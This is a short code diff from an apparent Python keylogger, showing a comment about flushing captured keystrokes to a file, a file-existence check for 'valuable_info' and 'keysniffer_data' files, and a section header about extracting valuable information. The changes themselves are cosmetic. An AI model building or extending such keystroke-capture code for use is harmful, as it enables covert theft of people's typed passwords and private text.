@@ -53,7 +53,7 @@ def keylogger():
                     path, "a", encoding="utf-8"
                 ) as data_file:  # Open in append mode
                     data_file.write("".join(typed_text))
-                    data_file.flush()  # Ensure immediate writing to the file
+                    data_file.flush()  # Ensure immediate writing to the file (doesnt stay in the buffer)
 
                 # Clear the list after writing
                 typed_text.clear()
@@ -97,7 +97,6 @@ def check_and_create_file(valuable_info, keysniffer_data, retries=3, delay=2):
 
     print(f"Failed to ensure both files exist: {valuable_info}, {keysniffer_data}")
     return False
-
 
 
 # ===================================================== Filter and Extract Valuable Info ====================================
